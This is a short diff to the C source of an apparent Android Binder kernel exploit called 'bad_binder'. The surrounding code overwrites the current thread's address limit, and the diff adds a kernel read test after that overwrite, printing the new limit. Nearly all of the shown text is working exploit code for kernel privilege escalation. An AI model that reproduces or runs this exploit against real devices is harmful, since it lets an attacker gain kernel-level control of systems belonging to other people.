@@ -10,6 +10,7 @@
 #include <sys/socket.h>
 
 #include "bad_binder.h"
+#include "kernel_rw.h"
 
 void hexdump_memory(unsigned char *buf, size_t byte_count) {
   unsigned long byte_offset_start = 0;
@@ -561,6 +562,12 @@ int32_t do_bad_binder(uint64_t* ppTaskStruct, uint64_t* ppThreadInfo, uint64_t* 
         printf("[-] failed to overwrite current thread's address limit!\n");
         goto done;
     }
+
+    printf("testing kernel r/w\n");
+
+    uint64_t test = kernel_read_ulong(pAddrLimit);
+
+    printf("new addr limit %lx\n", test);
 
     *ppTaskStruct = pTaskStruct;
     *ppThreadInfo = pThreadInfo;
